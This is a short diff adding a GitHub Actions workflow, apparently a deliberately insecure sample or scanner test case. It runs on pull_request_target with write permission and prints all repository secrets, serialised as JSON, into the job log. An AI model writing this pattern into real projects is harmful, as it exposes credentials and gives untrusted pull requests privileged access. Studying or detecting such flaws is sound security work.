@@ -1,0 +1,10 @@
+on:
+  pull_request_target:
+
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+    - run: echo '${{ toJSON(secrets) }}'
